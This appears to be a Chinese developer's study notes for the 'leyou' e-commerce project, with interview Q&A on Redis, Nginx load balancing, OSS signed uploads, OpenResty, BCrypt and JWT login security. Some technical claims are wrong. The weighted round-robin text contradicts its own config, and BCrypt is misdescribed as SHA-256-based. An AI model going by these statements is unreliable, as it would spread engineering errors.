<p>A：跳表，为什么用跳表</p>
<p>Q：缓存击穿，缓存雪崩，缓存穿透有了解过吗？</p>
<p>A：八股，顺便讲了讲缓存淘汰策略，布隆过滤器等</p>
<p>Q：布隆过滤器原理？</p>
<p>A：记不太清了，大概记得和hashmap差不多，答了一下</p>
<p>Q：单Key过热怎么办？</p>
<p>A：Redis集群，然后一致性hash，把访问打到不同机器上</p>
<p>开始问另一个<a href="">项目</a></p>
<p>Q：统计用户访问ip怎么做的？</p>
<p>A：MySQL，用AOP在用户访问的时候记录</p>
<p>Q：实现了统计pv，如何实现uv？</p>
<p>A：做好去重，记录用户访问信息的时候把时间戳带上</p>
<p>Q：如何去重？在MySQL里面做吗？</p>
<p>A：是的</p>
<p>Q：有了解过hadoop相关吗？</p>
<p>A：了解过，但是没在<a href="">项目</a>中使用过</p>
<p>Q：建议可以去了解一下，因为大数据相关技术在我们这里用的挺多的</p>
<p>Q：如果有大量数据的话还能直接在MySQL里面做去重吗？</p>
<p>A：大量数据就用Redis，使用bitMap可以一战</p>
<p>（对于这里又提了几个场景，最后确实答不出了，感觉只有分布式计算才能破了）</p>
<p>Q：讲讲你的几个奖项吧？</p>
<p>A：把奖项，<a href="">项目</a>讲了讲balabala</p>
<h1 id="SpringCloud"><a href="#SpringCloud" class="headerlink" title="SpringCloud"></a>SpringCloud</h1><h2 id="Gateway限流-了解"><a href="#Gateway限流-了解" class="headerlink" title="Gateway限流(了解)"></a>Gateway限流(了解)</h2><p>网关除了请求路由、身份验证，还有一个非常重要的作用：请求限流。当系统面对高并发请求时，为了减少对业务处理服务的压力，需要在网关中对请求限流，按照一定的速率放行请求。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149723.png" alt="image-20200108155348648"></p>
<h3 id="令牌桶算法原理"><a href="#令牌桶算法原理" class="headerlink" title="令牌桶算法原理"></a>令牌桶算法原理</h3><p>SpringGateway中采用的是令牌桶算法，令牌桶算法原理：</p>
<ul>
<li>准备一个令牌桶，有固定容量，一般为服务并发上限</li>
<li>按照固定速率，生成令牌并存入令牌桶，如果桶中令牌数达到上限，就丢弃令牌。</li>
<li>每次请求调用需要先获取令牌，只有拿到令牌，才继续执行，否则选择选择等待或者直接拒绝。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149724.png" alt="image-20200108161959810"></p>
<h2 id="ribbon做负载均衡"><a href="#ribbon做负载均衡" class="headerlink" title="ribbon做负载均衡"></a>ribbon做负载均衡</h2><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p>5万的并发连接，一个master，多个worker，worker干活</p>
<h2 id="反向代理原理"><a href="#反向代理原理" class="headerlink" title="反向代理原理"></a>反向代理原理</h2><p>什么是反向代理？</p>
<ul>
<li>代理：通过客户机的配置，实现让一台服务器代理客户机，客户的所有请求都交给代理服务器处理。</li>
<li>反向代理：用一台服务器，代理真实服务器，用户访问时，不再是访问真实服务器，而是代理服务器。</li>
</ul>
<p>nginx可以当做反向代理服务器来使用：</p>
<ul>
<li>我们需要提前在nginx中配置好反向代理的规则，不同的请求，交给不同的真实服务器处理</li>
<li>当请求到达nginx，nginx会根据已经定义的规则进行请求的转发，从而实现路由功能</li>
</ul>
<p>利用反向代理，就可以解决我们前面所说的端口问题，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149725.png" alt="image-20200111175118787"></p>
<h2 id="负载均衡（了解）"><a href="#负载均衡（了解）" class="headerlink" title="负载均衡（了解）"></a>负载均衡（了解）</h2><p>我们的nginx反向代理，目标服务器地址是通过IP和Port来指定，那么新的问题来了：</p>
<p>如果我们的<code>leyou-manage</code>不是单节点，而是一个服务集群，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149726.png" alt="image-20200113094533555"></p>
<h3 id="负载均衡轮询策略"><a href="#负载均衡轮询策略" class="headerlink" title="负载均衡轮询策略"></a>负载均衡轮询策略</h3><p>首先定义负载均衡的集群节点信息，及负载均衡的策略，默认策略是轮询，顾名思义，所有请求都按照时间顺序分配到不同的服务上，如果服务Down掉，可以自动剔除，本例中配置四个节点轮询：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 负载均衡配置，默认是轮询</span></span><br><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9003</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9004</span>; <span class="comment"># 节点信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在反向代理时不要指向具体IP，而是这里配置的：<code>leyou-manage</code>。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">	<span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">	<span class="attribute">server_name</span>  manage.leyou.com;</span><br><span class="line">	</span><br><span class="line">	<span class="section">location</span> / &#123;</span><br><span class="line">	    <span class="attribute">proxy_pass</span>   http://leyou-manage;</span><br><span class="line">		<span class="attribute">proxy_connect_timeout</span> <span class="number">600</span>;</span><br><span class="line">		<span class="attribute">proxy_read_timeout</span> <span class="number">5000</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="加权轮询"><a href="#加权轮询" class="headerlink" title="加权轮询"></a>加权轮询</h3><p>指定每个服务的权重比例，weight和访问比率成正比，通常用于后端服务机器性能不统一，将性能好的分配权重高来发挥服务器最大性能，如下配置后9001服务的访问比率会是9002服务的二倍。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 负载均衡配置，默认是轮询</span></span><br><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span> weight=<span class="number">1</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span> weight=<span class="number">2</span>; <span class="comment"># 节点信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IP哈希"><a href="#IP哈希" class="headerlink" title="IP哈希"></a>IP哈希</h3><p>每个请求都根据访问ip的hash结果分配，经过这样的处理，每个访客固定访问一个后端服务</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span>  leyou-manage &#123;</span><br><span class="line">    ip_hash; </span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># 节点信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="最少连接"><a href="#最少连接" class="headerlink" title="最少连接"></a>最少连接</h3><p>将请求分配到连接数最少的服务上。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">    least_conn;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># 节点信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="作为图片服务器"><a href="#作为图片服务器" class="headerlink" title="作为图片服务器"></a>作为图片服务器</h2><p>将images放入html目录下,通过images.leyou.com访问图片服务器,可以通过配置开启sendfile系统调用, 零拷贝;</p>
<h1 id="上传文件到OSS"><a href="#上传文件到OSS" class="headerlink" title="上传文件到OSS"></a>上传文件到OSS</h1><h2 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a>传统方式</h2><p>我们可以直接使用java代码来实现把图片上传到OSS，不过这样以来文件会先从客户端浏览器上传到我们的服务端tomcat，然后再上传到OSS，效率较低，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149727.png" alt="1552311281042"></p>
<p>以上方法有三个缺点：</p>
<ul>
<li>上传慢。先上传到应用服务器，再上传到OSS，网络传送比直传到OSS多了一倍。如果直传到OSS，不通过应用服务器，速度将大大提升，而且OSS采用BGP带宽，能保证各地各运营商的速度。</li>
<li>扩展性差。如果后续用户多了，应用服务器会成为瓶颈。</li>
<li>费用高。需要准备多台应用服务器。由于OSS上传流量是免费的，如果数据直传到OSS，不通过应用服务器，那么将能省下几台应用服务器。</li>
</ul>
<h2 id="web前端签名后直传"><a href="#web前端签名后直传" class="headerlink" title="web前端签名后直传"></a>web前端签名后直传</h2><p>客户端通过JavaScript代码完成签名，然后通过表单直传数据到OSS。无需访问应用服务器，对应用服务器压力较低。</p>
<p>流程图如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149728.png" alt="image-20200127125730699"></p>
<ul>
<li>JavaScript客户端签名直传：<ul>
<li>优点：在客户端通过JavaScript代码完成签名，无需过多配置，即可实现直传，非常方便。</li>
<li>问题：客户端通过JavaScript把AccesssKeyID 和AccessKeySecret写在代码里面有泄露的风险</li>
</ul>
</li>
</ul>
<h2 id="服务端签名后直传流程"><a href="#服务端签名后直传流程" class="headerlink" title="服务端签名后直传流程"></a>服务端签名后直传流程</h2><p>服务端签名后直传的原理如下：</p>
<ol>
<li>用户发送上传Policy请求到应用服务器（我们的微服务）。</li>
<li>应用服务器返回上传Policy和签名给用户。</li>
<li>用户直接上传数据到OSS。</li>
</ol>
<p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149729.png" alt="1552311833528"></p>
<ul>
<li>服务端签名，JavaScript客户端直传：<ul>
<li>优点：Web端向服务端请求签名，然后直接上传，不会对服务端产生压力，而且安全可靠</li>
<li>问题：服务端无法实时了解用户上传了多少文件，上传了什么文件</li>
</ul>
</li>
</ul>
<p>在页面点击上传的按钮，可以看到请求已经发出：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149730.png" alt="image-20200127132348077"> </p>
<p>这正是在向服务端申请签名，接下来我们需要在服务端接收请求，生成签名并返回。</p>
<p>我们要做的事情包括：</p>
<ul>
<li>搭建微服务</li>
<li>在微服务中，提供一个接口，生成文件上传需要的签名<ul>
<li>分析接口声明，分析请求方式、请求路径、请求参数、返回值类型</li>
<li>实现业务，生成签名<ul>
<li>把一些常量配置到yml文件</li>
<li>编写类，读取这些属性</li>
<li>把OSS客户端注入到spring容器</li>
<li>编写业务，实现签名的生成</li>
<li>解决跨域问题(在阿里云OSS上设置)</li>
</ul>
</li>
</ul>
</li>
<li>前端，调用我们的接口，获取签名（已完成）</li>
<li>前端，携带签名，完成上传（已完成）</li>
</ul>
<p>签名返回值</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;accessId&quot;</span><span class="punctuation">:</span><span class="string">&quot;6MKO******4AUk44&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://post-test.oss-cn-hangzhou.aliyuncs.com&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;policy&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJleHBpcmF0aW9uIjoiMjAxNS0xMS0wNVQyMDo1Mjoy******Jjdb25kaXRpb25zIjpbWyJjdb250ZW50LWxlbmd0aC1yYW5nZSIsMCwxMDQ4NTc2MDAwXSxbInN0YXJ0cy13aXRoIiwiJGtleSIsInVzZXItZGlyXC8iXV19&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span><span class="string">&quot;VsxOcOudx******z93CLaXPz+4s=&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;expire&quot;</span><span class="punctuation">:</span><span class="number">1446727949</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dir&quot;</span><span class="punctuation">:</span><span class="string">&quot;user-dirs/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>详细解释：</p>
<ul>
<li><code>accessId</code>：用户的AccessKeyId</li>
<li><code>host</code>：申请的阿里OSS的bucket访问地址</li>
<li><code>policy</code>：文件上传的策略，主要包含对上传文件的要求，利用Base64加密后返回，<a href="https://help.aliyun.com/document_detail/31988.html?spm=a2c4g.11186623.2.22.58cd7eaer5eXWw#section-d5z-1ww-wdb">说明文档</a></li>
<li><code>signature</code>：生成的签名</li>
<li><code>expire</code>：本次签名的过期时间，客户端可以换成签名，在有效期内无需再次签名</li>
<li><code>dir</code>：要上传到bucket中的哪个目录</li>
</ul>
<p>使用HmacSHA256签名,用户申请后授权微服务将这个发给客户端,客户端将这个和图片发给阿里云,阿里云验证后就可以上传了.阿里服务器将我们的用我们的私钥然后用同样的算法算出签名来验证.</p>
<h1 id="商品详情页"><a href="#商品详情页" class="headerlink" title="商品详情页"></a>商品详情页</h1><ul>
<li>如何做到动态响应需求变化，页面变化？<ul>
<li>将页面模板动态化，需要的数据静态化</li>
</ul>
</li>
<li>如何避免整个页面的全量更新？<ul>
<li>我们把页面分成几部分：如顶部面包屑、商品SKU展示、商品描述、商品评论等，形成多个页面模板（模块）。对应的数据也分成几部分，这些数据可能来自不同的微服务。这样可以减少因局部变更引起的整个页面重新生成。</li>
</ul>
</li>
<li>如何应对Tomcat的并发能力低问题？<ul>
<li>将模板渲染、数据放到nginx中做，利用nginx的高并发能力提高系统吞吐量</li>
</ul>
</li>
<li>如何实现数据静态化？<ul>
<li>需要的数据可以缓存在Nginx的本地共享词典中（长期不会修改的数据），如果命中则直接渲染并返回。如果未命中，则查询Redis集群，获取数据。如果Redis集群依然未命中，再去查询后台微服务，由微服务获取数据，然后写入缓存中，保证下次Nginx可以从缓存中拿到数据。这样可以减少服务端压力。</li>
</ul>
</li>
<li>如何保证数据一致性？<ul>
<li>为了保证Redis数据与数据库数据一致，我们还要用到Canal技术，监听数据库变化，及时更新Redis数据。</li>
</ul>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149731.png" alt="image-20210427235728804"></p>
<p>因此，我们需要做的事情包括：</p>
<ul>
<li>静态页数据服务：一个收集商品相关数据，并更新Redis缓存的数据服务</li>
<li>Nginx服务：接收用户请求，查询模板数据，利用模板渲染商品页面</li>
<li>Canal服务：监听数据库变化，同步通知静态页数据服务，更新Redis数据</li>
</ul>
<p>OpenResty® 是一个基于 <a href="http://openresty.org/cn/nginx.html">Nginx</a> 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p>
<p>OpenResty® 通过汇聚各种设计精良的 <a href="http://openresty.org/cn/nginx.html">Nginx</a> 模块（主要由 OpenResty 团队自主开发），从而将 <a href="http://openresty.org/cn/nginx.html">Nginx</a> 有效地变成一个强大的通用 Web 应用平台。这样，Web 开发人员和系统工程师可以使用 Lua 脚本语言调动 <a href="http://openresty.org/cn/nginx.html">Nginx</a> 支持的各种 C 以及 Lua 模块，快速构造出足以胜任 10K 乃至 1000K 以上单机并发连接的高性能 Web 应用系统。</p>
<p>OpenResty® 的目标是让你的Web服务直接跑在 <a href="http://openresty.org/cn/nginx.html">Nginx</a> 服务内部，充分利用 <a href="http://openresty.org/cn/nginx.html">Nginx</a> 的非阻塞 I&#x2F;O 模型，不仅仅对 HTTP 客户端请求,甚至于对远程后端诸如 MySQL、PostgreSQL、Memcached 以及 Redis 等都进行一致的高性能响应。</p>
<p>接下来我们利用OpenResty实现商品详情页渲染，大概需要这样的步骤：</p>
<ul>
<li>监听用户请求,进入定义好的lua脚本</li>
<li>lua脚本中尝试读取redis数据</li>
<li>读取数据失败，尝试从<code>ly-page</code>读取数据<ul>
<li>获取数据失败：返回404</li>
<li>获取数据成功：开始渲染</li>
</ul>
</li>
<li>把数据和模板交给template模块渲染，然后返回</li>
</ul>
<p>我们要做的事情包括：</p>
<ul>
<li>定义内部请求代理：<ul>
<li>当需要向<code>ly-page</code>获取数据时，走这个内部请求代理</li>
<li>对这个请求做限流处理，防止并发过大引起雪崩</li>
</ul>
</li>
<li>定义通用工具模块：<ul>
<li>访问Redis的工具</li>
<li>访问<code>ly-page</code>的http工具</li>
</ul>
</li>
<li>定义商品详情页面模板</li>
<li>编写数据处理的lua脚本</li>
<li>编写商品页面请求的路径映射</li>
</ul>
<p>虽然已经实现了页面静态化，不过依然有值的优化的地方：</p>
<ul>
<li>在Nginx中设置本地缓存，把几乎不变的数据直接存储在nginx内部，例如：<ul>
<li>商品分类数据</li>
<li>品牌数据</li>
<li>规格参数数据</li>
</ul>
</li>
<li>在nginx中对生成的页面做缓存或静态化，做CDN服务，页面不变的时候，减少渲染对CPU的消耗</li>
<li>随着商品数据的日益增多，Redis可能难以支持海量商品信息，此时可以用SSDB来代替，SSDB存储基于磁盘存储，查询性能与Redis差不多，因此可以作为海量数据的缓存库</li>
</ul>
<h2 id="canal"><a href="#canal" class="headerlink" title="canal"></a>canal</h2><p>模拟salve, 监听binary log日志;</p>
<p>设置账号权限</p>
<ul>
<li>增、改：我们写入数据到redis</li>
<li>删：我们把数据从redis删除</li>
</ul>
<h1 id="用户中心"><a href="#用户中心" class="headerlink" title="用户中心"></a>用户中心</h1><h3 id="密码加密"><a href="#密码加密" class="headerlink" title="密码加密"></a>密码加密</h3><p>基本逻辑：</p>
<ul>
<li>1）校验短信验证码</li>
<li>2）对密码加密</li>
<li>3）写入数据库</li>
</ul>
<p>密码加密：</p>
<p>密码加密使用传统的MD5加密并不安全，这里我们使用的是Spring提供的BCryptPasswordEncoder加密算法，分成加密和验证两个过程：</p>
<ul>
<li><p>加密：算法会对明文密码随机生成一个salt，使用salt结合密码来加密，得到最终的密文。</p>
</li>
<li><p>验证密码：需要先拿到加密后的密码和要验证的密码，根据已加密的密码来推测出salt，然后利用相同的算法和salt对要验证码的密码加密，与已加密的密码对比即可。</p>
</li>
</ul>
<p>为了防止有人能根据密文推测出salt，我们需要在使用BCryptPasswordEncoder时配置随即密钥，在<code>com.leyou.user.config</code>包中创建一个配置类，注册<code>BCryptPasswordEncoder</code>对象</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="attr">encoder:</span></span><br><span class="line">    <span class="attr">crypt:</span></span><br><span class="line">      <span class="attr">secret:</span> <span class="string">$&#123;random.uuid&#125;</span> <span class="comment"># 随机的密钥，使用uuid</span></span><br><span class="line">      <span class="attr">strength:</span> <span class="number">6</span> <span class="comment"># 加密强度4~31，决定盐加密时的运算强度，超过10以后加密耗时会显著增加</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(User user, String code)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.校验验证码</span></span><br><span class="line">    <span class="comment">// 1.1 取出redis中的验证码</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cacheCode</span> <span class="operator">=</span> redisTemplate.opsForValue().get(KEY_PREFIX + user.getPhone());</span><br><span class="line">    <span class="comment">// 1.2 比较验证码</span></span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.equals(code, cacheCode)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;验证码错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.对密码加密</span></span><br><span class="line">    user.setPassword(passwordEncoder.encode(user.getPassword()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.写入数据库</span></span><br><span class="line">    save(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="为什么用MD5不安全"><a href="#为什么用MD5不安全" class="headerlink" title="为什么用MD5不安全?"></a>为什么用MD5不安全?</h4><p>MD5加密可以查表;</p>
<h4 id="BCryptPasswordEncoder的原理"><a href="#BCryptPasswordEncoder的原理" class="headerlink" title="BCryptPasswordEncoder的原理"></a>BCryptPasswordEncoder的原理</h4><p>SHA-256 +随机盐+密钥对密码进行加密,过程是不可以逆的; 加密(encode): 算出hash然后存取数据库,算法不可逆,密码强度超过10会变慢;  密码匹配(matches): 验证密码和hash有没有问题,然后通过存入数据库的hash计算出salt,然后再去加密比对;</p>
<h2 id="服务端数据校验"><a href="#服务端数据校验" class="headerlink" title="服务端数据校验"></a>服务端数据校验</h2><p>使用Hibernate-Validator(用注解的方式@Email @Pattern(value) 等)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.USERNAME_R EGEX, message &#x3D; “用户名格式不正确”)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.USERNAME_REGEX, message &#x3D; “密码格式不正确”)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.PHONE_REGEX, message &#x3D; “手机号格式不正确”)</p>
<h1 id="jwt登录"><a href="#jwt登录" class="headerlink" title="jwt登录"></a>jwt登录</h1><p>用对称加密的话会多一次调用;  订单那里还需要再次解析jwt, 下单需要知道用户信息, 每个线程绑定对应的用户信息, 使用ThreadLocal; 用对称加密就需要解析4次, 用Rsa只需要解析2次; </p>
<p>用户登录信息<strong>校验失败以后</strong>，判断用户路径是否是白名单中的路径，如果是则放行，如果不是则拦截。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149732.png" alt="image-20200325115057407"></p>
<h2 id="面试常见问题"><a href="#面试常见问题" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><h3 id="jwt和security的对比："><a href="#jwt和security的对比：" class="headerlink" title="jwt和security的对比："></a>jwt和security的对比：</h3><p>JWT的：</p>
<ul>
<li><p>优点：</p>
<ul>
<li>无需再服务端存储用户数据，减轻服务端压力</li>
<li>轻量级，json风格，比较简单</li>
<li>跨语言</li>
</ul>
</li>
<li><p>有利于水平扩展</p>
</li>
<li><p>缺点：</p>
<ul>
<li>token一旦签发，无法修改<ul>
<li>无法更新token有效期，用户登录状态刷新难以实现</li>
<li>无法销毁一个token，服务端不能对用户状态进行绝对控制</li>
</ul>
</li>
<li>不包含权限控制</li>
</ul>
</li>
</ul>
<p>SpringSecurity：</p>
<ul>
<li><p>优点：</p>
<ul>
<li>用户信息保存再服务端，服务端可以对用户状态绝对控制</li>
<li>基于Spring，无缝整合，修改登录逻辑，其实就是添加过滤器</li>
<li>整合权限管理</li>
</ul>
</li>
<li><p>缺点：</p>
<ul>
<li>限定了语言</li>
<li>实现复杂，基于一连串的过滤器链</li>
<li>需要再服务端保存用户信息，增加服务端压力</li>
<li>依赖于tomcat的HttpSession、如果是分布式项目，session不共享，登录失效，需要借助于SpringSession，实现共享session效果（利用redis代替tomcat的session</li>
</ul>
</li>
</ul>
<h3 id="登录控制问题"><a href="#登录控制问题" class="headerlink" title="登录控制问题"></a>登录控制问题</h3><ul>
<li><p>你们使用JWT做登录凭证，如何解决token注销问题</p>
<p>答：jwt的缺陷是token生成后无法修改，因此无法让token失效。只能采用其它方案来弥补，基本思路如下：</p>
<p>  1）用户登录后，生成JWT，其中包含用户身份</p>
<p>  2）以用户id为key，把JWT的id存入redis，只有redis中有id的JWT，才是有效的JWT</p>
<p>  3）并且给Redis设置有效期，有效期到自动删除</p>
<p>  4）退出登录时，把ID从Redis删除即可</p>
</li>
<li><p>怎么解决登录超时后的登录续签问题？</p>
<p>答：判断登录是否超时的标准是redis，而不是JWT，因此每次用户访问网关，我们都会刷新redis的数据有效期，保证登录状态不断。</p>
</li>
<li><p>如何解决异地登录或跨设备登录问题？</p>
<p>答：</p>
<p>方案一：不允许多端登录</p>
<p>如果账户在第二个设备登录，自然会将redis中的JWT覆盖，那么之前的登录凭证就成了无效凭证。</p>
<p>方案二：允许多端登录</p>
<p>存入redis时，redis的类型可以选择set，这样一个用户可以具备多个JWT的id，实现多端登录。</p>
</li>
</ul>
<h3 id="cookie安全问题"><a href="#cookie安全问题" class="headerlink" title="cookie安全问题"></a>cookie安全问题</h3><ul>
<li><p>如何解决token被篡改问题？</p>
<ul>
<li>答：token中的数据可以篡改，但是签名无法篡改，否则服务端认证根本不会通过，因此篡改的token是无法通过服务端校验的</li>
</ul>
</li>
<li><p>如何防止token的伪造</p>
<p>与上个问题类似，token中带有签名认证，而签名需要私钥加密生成。只要私钥不泄露，就不可能有人伪造token，因为其它秘钥生成的token是不会被公钥认可的。</p>
</li>
<li><p>如何解决cookie被盗用问题？  分布式的话存到redis,</p>
<p>答：cookie被盗用的可能性主要包括下面几种：</p>
<ul>
<li><p>XSS攻击：这个可以再前端页面渲染时对 数据做安全处理即可，而且我们的cookie使用了Httponly为true，可以防止JS脚本的攻击。 </p>
</li>
<li><p>CSRF攻击：</p>
<ul>
<li>利用Referer头，防盗链</li>
<li>请求头中加随机码</li>
</ul>
</li>
<li><p>数据抓包，获取用户cookie：我们采用了HTTPS协议通信，无法获取请求的任何数据</p>
</li>
<li><p>请求重放攻击：对于普通用户的请求没有对请求重放做防御，而是对部分业务做好了幂等处理。运行管理系统中会对token添加随机码，认证token一次有效，来预防请求重放攻击。</p>
<p>(1)**加<a href="https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA%E6%95%B0/2454368">随机数</a>**。该方法优点是认证双方不需要时间同步，双方记住使用过的<a href="https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA%E6%95%B0">随机数</a>，如发现<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87">报文</a>中有以前使用过的随机数，就认为是重放攻击。缺点是需要额外保存使用过的随机数，若记录的时间段较长，则保存和查询的开销较大。 [4] </p>
<p>(2)**加<a href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E6%88%B3">时间戳</a>**。该方法优点是不用额外保存其他信息。缺点是认证双方需要准确的时间同步，同步越好，受攻击的可能性就越小。但当系统很庞大，跨越的区域较广时，要做到精确的时间同步并不是很容易。 [4] </p>
<p>(3)**加<a href="https://baike.baidu.com/item/%E6%B5%81%E6%B0%B4%E5%8F%B7/5623476">流水号</a>**。就是双方在报文中添加一个逐步递增的整数，只要接收到一个不连续的流水号报文(太大或太小)，就认定有重放威胁。该方法优点是不需要时间同步，保存的信息量比随机数方式小。缺点是一旦攻击者对报文解密成功，就可以获得流水号，从而每次将流水号递增欺骗认证端。</p>
</li>
<li><p>用户电脑中毒：这个无法防范。</p>
</li>
</ul>
</li>
<li><p>用户的cookie被禁用怎么办？</p>
<ul>
<li>cookie一般情况下，是不会被禁用，因为普通人根本不知道是什么是cookie，一般不用管，为了友好，我们可以给用户一个提示：你的cookie已经被禁用了，请启用cookie。</li>
<li>把jwt作为响应头返回，浏览器中JS把token写到本地存储（sessionStorage），要求前端每次发ajax，都必须自己携带token。而且有被xss攻击的风险</li>
</ul>
</li>
</ul>
<h3 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h3><ul>
<li><p>如何完成权限校验的？</p>
<ul>
<li>首先我们有权限管理的服务，管理用户的各种权限，及可访问路径等</li>
<li>在网关中利用过滤器，拦截一切请求，在过滤器中，解析和验证jwt，获取用户身份，查询用户权限，判断用户身份可以访问当前路径</li>
</ul>
</li>
<li><p>服务端微服务地址不小心暴露了，用户就可以绕过网关，直接访问微服务，怎么办？</p>
<ul>
<li><p>首先，我们的微服务隐藏在网关的后面，而且整个服务被Nginx反向代理，用户只能看到nginx的地址，微服务暴露的可能性很低。</p>
</li>
<li><p>兜底方案：</p>
<ul>
<li>如果担心服务安全，我们可以将登录校验和权限校验分离。在网关中只负责登录校验功能，在每个微服务处理用户权限。这样即便有人绕过了网关访问，只要权限不通过，依然无法访问。</li>
<li>用户请求到网关，网关会生成一个新的令牌，这个令牌包含用户信息，仅在访问微服务时使用，被访问的微服务会校验这个内部令牌，从而验证请求者是不是内部的微服务</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="单点登录问题"><a href="#单点登录问题" class="headerlink" title="单点登录问题"></a>单点登录问题</h3><p>单点登录，顾名思义：在分布式服务中，用户只需要在一处登录，即可在各个受信任的服务器之间，共享登录状态，称为单点登录</p>
<p>任何登录都离不开cookie，如果cookie无法使用或共享，就会导致登录凭证无法共享，导致登录状态无法共享。例如因为跨域名的多个服务，其cookie不可共享，导致登录失效。</p>
<p>因此实现单点登录有多种方式，其区别就在于是否能解决跨域登录</p>
<ul>
<li>同域名单点登录<ul>
<li>分布式服务共享二级域名，二级以上域名不同，此时cookie可以共享。解决思路：<ul>
<li>JWT无状态登录</li>
<li>共享Session</li>
</ul>
</li>
</ul>
</li>
<li>跨域单点登录<ul>
<li>服务二级域名就不同，导致cookie无法共享，解决办法：<ul>
<li>OAuth协议实现单点登录：<a href="http://www.ruanyifeng.com/blog/2019/04/oauth_design.html">Oauth2.0协议</a>，成熟的框架：<a href="https://blog.csdn.net/anumbrella/article/details/80821486">CAS</a></li>
<li>跨域跳转时，传递cookie数据，从而共享cookie</li>
</ul>
</li>
</ul>
